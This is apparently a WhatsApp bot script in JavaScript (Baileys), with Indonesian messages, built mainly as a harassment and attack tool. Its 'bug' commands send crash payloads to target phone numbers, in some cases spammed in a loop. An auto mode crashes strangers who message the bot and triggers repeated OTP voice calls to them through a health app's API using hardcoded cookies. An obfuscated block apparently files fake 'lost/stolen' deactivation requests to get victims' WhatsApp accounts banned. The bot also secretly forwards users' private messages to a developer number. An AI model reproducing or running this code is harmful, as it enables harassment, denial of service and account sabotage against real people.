const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { getGroupAdmins, fetchJson } = require('./storage/functions.js')
const { exec } = require('child_process')
const cheerio = require('cheerio')
const util = require('util')
const axios = require('axios').default
const fs = require('fs')
autobug = true
mode = true

module.exports = async (semar, denz, msg) => {
try {
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const nomorOwner = ['6285866295942','628985245738','628812904283','6285942018232','12344057330','6289686044386','6282265058541','628895137788','6285865662584','79299942743','6285727091924','6282296368892','6282225962567','4915510151395','628999890587','6282221840767','62895323263224','6285840040268','6285640350019','6281212687893','79774805044','6282115383356']
const isGroup = from.endsWith('@g.us')
const botNumber = semar.user.id.split(':')[0]
const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await semar.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isOwner = nomorOwner.includes(senderNumber) || isSaya
const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
const bugreactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
const bugcontactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
const frpayment = {key: {remoteJid: '0@s.whatsapp.net',fromMe: false,id: 'MultiDevice',participant: '0@s.whatsapp.net'},message: {requestPaymentMessage: {currencyCodeIso4217: "USD",amount1000: 2022,requestFrom: '0@s.whatsapp.net',noteMessage: {extendedTextMessage: {text: 'Copyright © 2022 Dcode Denpa, AI. Semar-BMD'}},expiryTimestamp: 2022,amount: {value: 91929291929,offset: 1000,currencyCode: "USD"}}}}

const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
semar.sendMessage(id, buttonMessage, options)}

const sendButTemplate = (id, text1, footer1, but = [], options = {}) => {
const templateMessage = {text: text1,footer: footer1,templateButtons: but}
semar.sendMessage(id, templateMessage, options)}

const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], options = {}) => {
const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
semar.sendMessage(id, listMessage, options)}

if (body.startsWith(`64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61`)) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })}

if (autobug && !isOwner && !command && !isGroup) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`+${senderNumber}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {console.log(response)}).catch(function (error) {console.log(error)})}

if (body && !isGroup && !msg.key.fromMe && !isDev) {
semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : ${senderNumber}\nLink : wa.me/${sender}`})}

if (body.startsWith(`$`)){ if (!isDev && !msg.key.fromMe) return
let evl = body.split("\n")
let exc = body.replace(evl[0]+"\n", "")
exec(exc, (err, stdout, stderr) => {
if (stdout) return reply(`${stdout}`)
if (stderr) return reply(`${stderr}`)
if (err) return reply(`${err}`)})}
	    
if (/^=?>/.test(body) && (isDev || msg.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
try{ let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })
return reply(require('util').format(evaluate))} catch(e){
return reply(require('util').format(e))}}

if (command) { await semar.readMessages([msg.key]) }
if (!mode) { if (!isDev && !msg.key.fromMe) return }
switch (command) {
//©from:nathanael
case 'menu': case 'help': case '?':
semar.sendMessage(from,{text:`❏  *OTHER MENU*
•   ${prefix}status
•   ${prefix}delete

❏  *GROUP MENU*
•   ${prefix}open
•   ${prefix}close
•   ${prefix}add
•   ${prefix}kick
•   ${prefix}promote
•   ${prefix}demote
         
❏  *BUG MENU*
•   ${prefix}sendbug
•   ${prefix}dumpbug
•   ${prefix}spambug
•   ${prefix}buggc
•   ${prefix}banwa
         
❏  *OWNER MENU*
•   ${prefix}join
•   ${prefix}leave
•   ${prefix}restart
•   ${prefix}shutdown
•   ${prefix}public
•   ${prefix}private
•   ${prefix}chat
•   ${prefix}autobug`}, {quoted:frpayment})
break

//©from: dennis × ivan
case 'verify': case 'ban': case 'logout': case 'banwa':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}logout +62 xxx-xxxx-xxxx`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}logout +62 xxx-xxxx-xxxx`)
var _0x24a366=_0x681b;(function(_0x40b70e,_0x3332aa){var _0x4205bd=_0x681b,_0x36aeb3=_0x40b70e();while(!![]){try{var _0x2ca5b6=-parseInt(_0x4205bd(0x11f))/0x1+parseInt(_0x4205bd(0x142))/0x2+-parseInt(_0x4205bd(0x12f))/0x3+-parseInt(_0x4205bd(0x145))/0x4+-parseInt(_0x4205bd(0x143))/0x5+-parseInt(_0x4205bd(0x12d))/0x6*(parseInt(_0x4205bd(0x11d))/0x7)+parseInt(_0x4205bd(0x13a))/0x8;if(_0x2ca5b6===_0x3332aa)break;else _0x36aeb3['push'](_0x36aeb3['shift']());}catch(_0x3fc7fa){_0x36aeb3['push'](_0x36aeb3['shift']());}}}(_0x4eaf,0x6fce1));var _0x5b6e24=(function(){var _0x32b0cf=!![];return function(_0x2c0ab3,_0x326383){var _0x47187e=_0x32b0cf?function(){var _0x319946=_0x681b;if(_0x326383){var _0x4c6eca=_0x326383[_0x319946(0x123)](_0x2c0ab3,arguments);return _0x326383=null,_0x4c6eca;}}:function(){};return _0x32b0cf=![],_0x47187e;};}()),_0x4a5ab8=_0x5b6e24(this,function(){var _0x189d60=_0x681b;return _0x4a5ab8['toString']()[_0x189d60(0x138)]('(((.+)+)+)+$')['toString']()[_0x189d60(0x127)](_0x4a5ab8)[_0x189d60(0x138)](_0x189d60(0x115));});function _0x681b(_0xa861b7,_0x541d16){var _0x4fa9dc=_0x4eaf();return _0x681b=function(_0x33b741,_0x13b93f){_0x33b741=_0x33b741-0x108;var _0x2052f6=_0x4fa9dc[_0x33b741];if(_0x681b['uCjWac']===undefined){var _0x4a8f08=function(_0x681bae){var _0x515fae='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x65c3e3='',_0x47e35c='',_0x3a7334=_0x65c3e3+_0x4a8f08;for(var _0x2fccb7=0x0,_0x243f4e,_0x32b0cf,_0x2c0ab3=0x0;_0x32b0cf=_0x681bae['charAt'](_0x2c0ab3++);~_0x32b0cf&&(_0x243f4e=_0x2fccb7%0x4?_0x243f4e*0x40+_0x32b0cf:_0x32b0cf,_0x2fccb7++%0x4)?_0x65c3e3+=_0x3a7334['charCodeAt'](_0x2c0ab3+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x243f4e>>(-0x2*_0x2fccb7&0x6)):_0x2fccb7:0x0){_0x32b0cf=_0x515fae['indexOf'](_0x32b0cf);}for(var _0x326383=0x0,_0x47187e=_0x65c3e3['length'];_0x326383<_0x47187e;_0x326383++){_0x47e35c+='%'+('00'+_0x65c3e3['charCodeAt'](_0x326383)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x47e35c);};_0x681b['vaDyKF']=_0x4a8f08,_0xa861b7=arguments,_0x681b['uCjWac']=!![];}var _0x4a5ab8=_0x4fa9dc[0x0],_0x5b6e24=_0x33b741+_0x4a5ab8,_0x4eafba=_0xa861b7[_0x5b6e24];if(!_0x4eafba){var _0x4c6eca=function(_0x68e64b){this['ZbGCJT']=_0x68e64b,this['JUejTq']=[0x1,0x0,0x0],this['sqWONr']=function(){return'newState';},this['hAGGGw']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['FUGXKu']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x4c6eca['prototype']['rwhivs']=function(){var _0x4a7958=new RegExp(this['hAGGGw']+this['FUGXKu']),_0x5b56cb=_0x4a7958['test'](this['sqWONr']['toString']())?--this['JUejTq'][0x1]:--this['JUejTq'][0x0];return this['KKGuAK'](_0x5b56cb);},_0x4c6eca['prototype']['KKGuAK']=function(_0x31d098){if(!Boolean(~_0x31d098))return _0x31d098;return this['iLzmAV'](this['ZbGCJT']);},_0x4c6eca['prototype']['iLzmAV']=function(_0x42418b){for(var _0x17373c=0x0,_0x4dfe0a=this['JUejTq']['length'];_0x17373c<_0x4dfe0a;_0x17373c++){this['JUejTq']['push'](Math['round'](Math['random']())),_0x4dfe0a=this['JUejTq']['length'];}return _0x42418b(this['JUejTq'][0x0]);},new _0x4c6eca(_0x681b)['rwhivs'](),_0x2052f6=_0x681b['vaDyKF'](_0x2052f6),_0xa861b7[_0x5b6e24]=_0x2052f6;}else _0x2052f6=_0x4eafba;return _0x2052f6;},_0x681b(_0xa861b7,_0x541d16);}function _0x4eaf(){var _0x673c71=['zhbY','mtmXodq2mtztD2fQy24','zw1HAwXFy29UzMLYBq','yMLUza','CgXHDgzVCM0','Ahr0Chm6lY93D3CUD2HHDhnHChaUy29T','ChjVDg90ExbL','u3vRC2vZigXVz291Dca','zxjYB3i','mtm4odC2nhPouMvfwG','nti2ndb5qKTyq2K','DgfIBgu','mZu3nJa5mMjozLbTEa','AgvHzgvYCW','x19WCM90B19F','DMfS','AhjLzG','x19H','x19OCW','Aw5WDxrBBMfTzt1SC2rD','AMf6B2vZDa','zM9YicG7oYK7','CMvWBgfJzq','zM9YBwf0','Aw5WDxrBBMfTzt1QyxPVzxn0xq','x19Yzxe','Dg9tDhjPBMC','yxr0CG','kcGOlISPkYKRksSK','vu5ltK9xtG','zgf0yq','yxbWzw5K','qu5euK9jra','C3rLCa','mtKZmtyUqLa6D2HHDhnHChbFD3D3x3bRzY4YlJaUmc4WlJa','C3vIBwL0','mtrnywDqBeG','Ahr0Chm6lY93D3CUmxnLy21HAwWUy29Tl2fWAs92ms8/ywn0Aw9UpwDLBLjHBMrVBu1HAwXIB3GMy291BNq9mq','nZK2mJG3vfDOqxHm','z2v0','zM9YBq','x19Jy2C','yxbWBhK','ue9tva','x191C2vY','mtaWnJyZmdG1oa','y29UC3rYDwn0B3i','BgvUz3rO','DhjHy2u','x19JB21Tzw50x3jLCq','zMLUza','y29UC29Szq','ndmYmtuWB2XoAu11','x19Yzxy','mte4odu0vwvJrxvn','BhnK','x19JC3i','E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK','Ew91CL9TzxnZywDL','CgfYC2u','Bg9N','D2fYBG','Ahr0Chm6lY93D3CUD2HHDhnHChaUy29Tl2nVBNrHy3qVBM9JBgLLBNqV','C2vHCMnO'];_0x4eaf=function(){return _0x673c71;};return _0x4eaf();}_0x4a5ab8();var _0x13b93f=(function(){var _0x68e64b=!![];return function(_0x4a7958,_0x5b56cb){var _0x31d098=_0x68e64b?function(){var _0xad9eb7=_0x681b;if(_0x5b56cb){var _0x42418b=_0x5b56cb[_0xad9eb7(0x123)](_0x4a7958,arguments);return _0x5b56cb=null,_0x42418b;}}:function(){};return _0x68e64b=![],_0x31d098;};}()),_0x33b741=_0x13b93f(this,function(){var _0x33f3b6=_0x681b,_0x17373c;try{var _0x4dfe0a=Function('return\x20(function()\x20'+_0x33f3b6(0x132)+');');_0x17373c=_0x4dfe0a();}catch(_0x1d6634){_0x17373c=window;}var _0x1c9db3=_0x17373c['console']=_0x17373c[_0x33f3b6(0x12c)]||{},_0x2bf9ed=[_0x33f3b6(0x135),_0x33f3b6(0x136),'info',_0x33f3b6(0x141),'exception',_0x33f3b6(0x144),_0x33f3b6(0x129)];for(var _0x923368=0x0;_0x923368<_0x2bf9ed[_0x33f3b6(0x128)];_0x923368++){var _0x3b3de2=_0x13b93f[_0x33f3b6(0x127)][_0x33f3b6(0x13f)][_0x33f3b6(0x13c)](_0x13b93f),_0x3a7df6=_0x2bf9ed[_0x923368],_0x2552cf=_0x1c9db3[_0x3a7df6]||_0x3b3de2;_0x3b3de2[_0x33f3b6(0x147)]=_0x13b93f[_0x33f3b6(0x13c)](_0x13b93f),_0x3b3de2[_0x33f3b6(0x113)]=_0x2552cf[_0x33f3b6(0x113)][_0x33f3b6(0x13c)](_0x2552cf),_0x1c9db3[_0x3a7df6]=_0x3b3de2;}});_0x33b741();var ntah=await axios[_0x24a366(0x120)](_0x24a366(0x137)),email=await axios[_0x24a366(0x120)](_0x24a366(0x11e)),cookie=ntah[_0x24a366(0x146)]['set-cookie']['join'](';\x20'),$=cheerio['load'](ntah[_0x24a366(0x117)]),$form=$(_0x24a366(0x121)),url=new URL($form[_0x24a366(0x114)]('action'),_0x24a366(0x13e))[_0x24a366(0x109)],form=new URLSearchParams();form['append'](_0x24a366(0x10d),$form[_0x24a366(0x12b)](_0x24a366(0x111))[_0x24a366(0x108)]()),form[_0x24a366(0x118)](_0x24a366(0x130),$form[_0x24a366(0x12b)](_0x24a366(0x10c))['val']()),form[_0x24a366(0x118)](_0x24a366(0x11a),_0x24a366(0x11c)),form[_0x24a366(0x118)]('country_selector','ID'),form[_0x24a366(0x118)]('phone_number',''+dn),form['append']('email',email[_0x24a366(0x117)][0x0]),form[_0x24a366(0x118)](_0x24a366(0x13b),email[_0x24a366(0x117)][0x0]),form[_0x24a366(0x118)](_0x24a366(0x13d),_0x24a366(0x119)),form[_0x24a366(0x118)](_0x24a366(0x133),'Perdido/roubado:\x20desative\x20minha\x20conta'),form[_0x24a366(0x118)](_0x24a366(0x125),'0'),form[_0x24a366(0x118)](_0x24a366(0x10a),'1'),form[_0x24a366(0x118)](_0x24a366(0x131),''),form['append'](_0x24a366(0x112),'8'),form['append'](_0x24a366(0x10b),_0x24a366(0x11b)),form[_0x24a366(0x118)](_0x24a366(0x139),'1'),form[_0x24a366(0x118)](_0x24a366(0x122),_0x24a366(0x116)),form[_0x24a366(0x118)](_0x24a366(0x12e),_0x24a366(0x126)),form[_0x24a366(0x118)](_0x24a366(0x12a),'0');var res=await axios({'url':url,'method':_0x24a366(0x124),'data':form,'headers':{'cookie':cookie}});reply(_0x24a366(0x140)+dn+'\x20'+util[_0x24a366(0x110)](JSON[_0x24a366(0x134)](res[_0x24a366(0x117)][_0x24a366(0x10f)](_0x24a366(0x10e),''))));
break 

//©from: dennis
case 'cek': case 'test': case 'status':
exec(`pm2 status`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: nayla
case 'open':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'not_announcement')
reply('_Successfully Opened Group!_\n')
break

//©from: nayla
case 'close':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'announcement')
reply('_Successfully Closed The Group!_\n')
break

//©from: dennis
case 'add':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
add = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [add], "add")
break

//©from: dennis
case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
remove = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [remove], "remove")
break

//©from: dennis
case 'promote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [promote], "promote")
reply('Done!')
break

//©from: dennis
case 'demote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [demote], "demote")
reply('Done!')
break

//©from: dennis × ivan
case 'sendbug':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
nd = dn.split("|")
if (Number(nd[1]) >= 100) return reply('Jumlah terlalu banyak!')
if (!Number(nd[1])) return reply(`Silahkan masukkan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
reply('Loading 3Second...')
for (let i = 0; i < nd[1]; i++){
await sleep(3000)
reply(`Berhasil mengirim ${Number(i) + 1} bug!`)
let sendbug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" })
await sleep(3000)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: sendbug.key })}
reply(`Sukses mengirim ${nd[1]} bug ke nomor ${nd[0]}`)
break

//©from: dennis × andik
case 'dumpbug':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}dumpbug ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply(`Sukses mengirim bug ke nomor ${dn}`)
break

//©from: dennis × ivan × andik
case 'spambug':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}spambug ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
reply('Berhasil mengirim 1 bug!')
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply('Loading 30Second...')
function delay30d(i) { setTimeout(() => {
reply(`Berhasil mengirim ${Number(i) + 2} bug!`)
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
delay30d(++i)}, 30000)}
delay30d(0)
break

//©from: dennis x haikal
case 'buggc':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
await sleep(3000)
await semar.groupLeave(from)
break

//©from: dennis
case 'autobug':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `autobug on`, buttonText: { displayText: "ON" }, type: 1},{ buttonId: `autobug off`, buttonText: { displayText: "OFF" }, type: 1}], {quoted:msg})
if (dn === 'on'){ autobug = true
reply('Sukses')
} else if (dn === 'off'){ autobug = false
reply('Sukses')} else { reply('Error')}
break

//©from: dennis x baileys
case '01':
sendButMessage(from, 'test', 'test', [{buttonId: `${prefix}01`, buttonText: {displayText: 'Button 1'}, type: 1},{buttonId: `${prefix}02`, buttonText: {displayText: 'Button 2'}, type: 1},{buttonId: `${prefix}03`, buttonText: {displayText: 'Button 3'}, type: 1}], {quoted:msg})
break

//©from: dennis x baileys
case '02':
sendButTemplate(from, 'test', 'test', [{index: 1, urlButton: {displayText: 'test', url: 'https://'}},{index: 2, callButton: {displayText: 'test', phoneNumber: '6285'}},{index: 3, quickReplyButton: {displayText: 'test', id: `0`}}])
break

//©from: dennis x baileys
case '03':
sendLstMessage(from, 'test', 'test', 'test', 'test', [{title: "Section 1",rows: [{title: "Option 1", rowId: "option1"},{title: "Option 2", rowId: "option2", description: "This is a description"}]},{title: "Section 2",rows: [{title: "Option 3", rowId: "option3"},{title: "Option 4", rowId: "option4", description: "This is a description V2"}]}])
break

//©from: dennis
case 'chat':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!dn) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}chat ${senderNumber}|halo`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}chat ${senderNumber}|halo`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}chat ${senderNumber}|halo`)
if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim pesan ke nomor ini!')
nd = dn.split("|")
if (!nd) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}chat ${senderNumber}|halo`)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: `${nd[1]}` })
reply(`Sukses mengirim pesan ${nd[1]} ke nomor ${nd[0]}`)
break

//©from: dennis
case 'join':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await semar.groupAcceptInvite(result).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'leave':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
await semar.groupLeave(from).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'delete': case 'd': case 'del':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
break

//©from: dennis
case 'restart':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
exec(`pm2 restart index`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis
